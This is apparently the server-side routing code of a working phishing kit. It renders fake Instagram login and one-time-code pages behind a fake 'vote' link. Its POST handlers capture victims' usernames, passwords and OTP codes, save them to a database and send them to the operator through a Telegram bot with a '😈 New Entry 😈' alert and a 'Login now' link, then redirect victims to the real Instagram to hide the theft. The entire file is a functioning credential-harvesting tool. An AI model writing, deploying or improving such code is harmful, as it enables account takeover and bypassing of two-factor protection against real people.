const TelegramID = require("../models/TelegramID");
const Links = require("../models/LinkModel");
const User = require("../models/User");
const Credential = require("../models/CredentialModel");
const router = require("express").Router();

const receiver = (bot) => {
    bot.on("message", async (msg) => {
        const chatId = msg.chat.id;
        const resp = msg.text;
        if (resp.toLocaleLowerCase() === '/start' || resp.toLocaleLowerCase() === "start") {
            const idExists = await TelegramID.findOne({ telegramID: chatId });
            if (!idExists) {
                const newID = new TelegramID({
                    telegramID: chatId
                });
                await newID.save()
            }
            bot.sendMessage(chatId, chatId);
        }
    });

    router.get("/vote/:linkId", async (req, res) => {
        try {
            const { linkId } = req.params;
            const link = await Links.findOne({ link: linkId });
            if (!link) {
                return res.redirect("/notfound");
            }
            return res.render("socials/vote", { req, name: link.modelName, linkId: link.id, layout: false });
        } catch (err) {
            console.log(err)
        }
    });

    router.get("/instagram/:linkId", (req, res) => {
        try {
            const { linkId } = req.params;
            if (linkId.length !== 24) {
                return res.redirect("/notfound");
            }
            return res.render("socials/instagram", { req, linkId, layout: false });
        } catch (err) {
            console.log(err)
        }
    });

    router.get("/instagram/otp/:linkId", async (req, res) => {
        try {
            const { linkId } = req.params;
            if (linkId.length !== 24) {
                return res.redirect("/notfound");
            }
            return res.render("socials/instaOTP", { req, linkId, layout: false });
        } catch (err) {
            console.log(err);
        }
    });

    router.post("/instagram/:linkId", async (req, res) => {
        try {
            const { username, password } = req.body;
            const { linkId } = req.params;
            if (linkId.length !== 24) {
                return res.redirect("/notfound");
            }
            const link = await Links.findById(linkId);
            const user = await User.findById(link.user);

            if (link?.name) {
                const newCredential = new Credential({
                    user: link.user,
                    link: linkId,
                    linkName: link.name,
                    fields: {
                        username,
                        password
                    }
                });
                await newCredential.save();
                await bot.sendMessage(user.telegramID, `
                😈 New Entry 😈
INSTAGRAM

username: ${username}
pasword: ${password}
OTP: ${link.otpEnabled ? "Wait for OTP after logging in" : "NO OTP LINK"}

Login now: https://www.instagram.com
                                                `)
                if (link.otpEnabled) {
                    return res.redirect("/instagram/otp/" + link.id);
                } else {
                    return res.redirect("/congrats");
                }
            }
            else {
                return res.redirect("/notfound");
            }
        } catch (err) {
            console.log(err)
        }
    });

    router.post("/instagram/otp/:linkId", async (req, res) => {
        try {
            const { linkId, code } = req.body;
            if (linkId.length !== 24) {
                return res.redirect("/notfound");
            }
            const link = await Links.findById(linkId);
            const user = await User.findById(link.user);

            if (link) {
                await bot.sendMessage(user.telegramID, `
😈 NEW ENTRY 😈
INSTAGRAM

OTP: ${code}

                `);
                return res.redirect("https://instagram.com")
            }
            else {
                return res.redirect("/notfound");
            }
        } catch (err) {
            console.log(err)
        }
    });

}


module.exports = { receiver, trouter: router }

module.exports.default = receiver